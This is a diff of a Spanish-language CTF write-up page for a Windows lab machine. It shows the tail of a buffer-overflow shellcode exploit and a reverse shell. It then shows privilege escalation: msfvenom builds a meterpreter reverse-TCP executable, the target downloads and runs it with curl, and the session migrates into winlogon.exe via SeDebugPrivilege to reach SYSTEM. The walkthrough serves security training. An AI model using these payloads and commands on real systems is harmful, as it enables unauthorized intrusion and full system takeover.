+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x1d\xc3\xa8\xe5\x40\xf4\x07\x29\x7d\x77\xad</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd2\x7a\x67\xc4\xd7\xc7\x2f\x35\xaa\x58\xda</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x39\x19\x58\xcf</span><span class="s">"</span><span class="p">
 
 offset</span><span class="o"> =</span><span class="mi"> 1032</span><span class="p">
 junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (offset </span><span class="o">- </span><span class="no">len</span><span class="p">(rop</span><span class="o"> +</span><span class="p"> shellcode))
@@ -1070,7 +1121,7 @@ shell.interactive()</span>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 2121: Done  
+[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.122.10 on port 2121: Done  
 [</span><span class="az">*</span><span class="p">] Switching to interactive mode
 </span><span class="ro">$</span>
 </code></pre></div></div><br>
@@ -1079,13 +1130,94 @@ shell.interactive()</span>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
 Listening on 0.0.0.0 443
-Connection received on 192.168.100.5 50047
+Connection received on 10.10.122.10 50536
 Microsoft Windows [Versión 10.0.20348.709]
 (c) Microsoft Corporation. Todos los derechos reservados.  
 
-C:\> </span><span class="am">whoami</span><span class="p">
-windows\user
-C:\></span>
+C:\shared> </span><span class="am">whoami</span><span class="p">
+rainbow2\dev
+C:\shared></span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="shell-system">
+<br><h3 class="post-title">Shell - system</h3><br>
+
+<p class="plain-text">Al listar los privilegios del usuario podemos ver que tiene <code class="language-plaintext highlighter-rouge">SeDebugPrivilege</code>, este privilegio nos permite sincronizarnos con cualquier proceso de cualquier usuario</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">C:\shared> </span><span class="am">whoami </span><span class="p">/priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========  
+SeDebugPrivilege              Debug programs                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeCreateGlobalPrivilege       Create global objects          Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+C:\shared></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La forma mas sencilla de explotarlo es utilizando un c2, asi que iniciamos definiendo un listener en <code class="language-plaintext highlighter-rouge">msfconsole</code> y creando un payload dentro de un <code class="language-plaintext highlighter-rouge">.exe</code> con <code class="language-plaintext highlighter-rouge">msfvenom</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo msfconsole </span><span class="p">-q
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0</span><span class="az"> Agents</span><span class="p">:0) >> use exploit/multi/handler
+</span><span class="az">[*] </span><span class="p">Using configured payload generic/shell_reverse_tcp
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0</span><span class="az"> Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> set payload windows/meterpreter/reverse_tcp  
+payload => windows/meterpreter/reverse_tcp
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0</span><span class="az"> Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> set lhost tun0
+lhost => tun0
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0</span><span class="az"> Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> set lport 4444
+lport => 4444
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0</span><span class="az"> Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> run
+
+</span><span class="az">[*] </span><span class="p">Started reverse TCP handler on 10.8.0.10:4444</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/meterpreter/reverse_tcp LHOST=10.8.0.10 LPORT=4444 -f exe -o shell.exe  
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of exe file: 73802 bytes
+Saved as: shell.exe
+
+</span><span class="ve">❯ sudo python3</span><span class="p"> -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al descargarlo y ejecutarlo nos llega una sesión de meterpreter como el usuario <code class="language-plaintext highlighter-rouge">dev</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">C:\ProgramData> </span><span class="am">curl</span><span class="p"> 10.8.0.10/shell.exe</span><span class="c1"> -o </span><span class="p">shell.exe  
+
+C:\ProgramData> </span><span class="am">shell.exe</span><span class="p">
+
+C:\ProgramData></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0</span><span class="az"> Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> run
+
+</span><span class="az">[*] </span><span class="p">Started reverse TCP handler on 10.8.0.10:4444
+</span><span class="az">[*] </span><span class="p">Sending stage (176198 bytes) to 10.10.122.10
+</span><span class="az">[*] </span><span class="p">Meterpreter session 1 opened (10.8.0.10:4444 -> 10.10.122.10:50647)  
+
+(</span><span class="ve">Meterpreter</span><span class="az"> 1</span><span class="p">)(C:\shared) > getuid
+Server username: RAINBOW2\dev
+(</span><span class="ve">Meterpreter</span><span class="az"> 1</span><span class="p">)(C:\shared) ></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora para explotar el privilegio <code class="language-plaintext highlighter-rouge">SeDebugPrivilege</code> podemos simplemente migrar a un proceso con altos privilegios como el <code class="language-plaintext highlighter-rouge">winlogon.exe</code>, luego de migrar nos convertimos en el usuario que corre ese proceso, en este caso es el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">(</span><span class="ve">Meterpreter</span><span class="az"> 1</span><span class="p">)(C:\shared) > migrate -N winlogon.exe  
+</span><span class="az">[*] </span><span class="p">Migrating from 2316 to 704...
+</span><span class="az">[*] </span><span class="p">Migration completed successfully.
+(</span><span class="ve">Meterpreter</span><span class="az"> 1</span><span class="p">)(C:\Windows\system32) > getuid
+Server username: NT AUTHORITY\SYSTEM
+(</span><span class="ve">Meterpreter</span><span class="az"> 1</span><span class="p">)(C:\Windows\system32) ></span>
 </code></pre></div></div><br>
 
 </section>
@@ -1102,4 +1234,7 @@ C:\></span>
     </div>
   </body>
 </html>
+
+
+
 
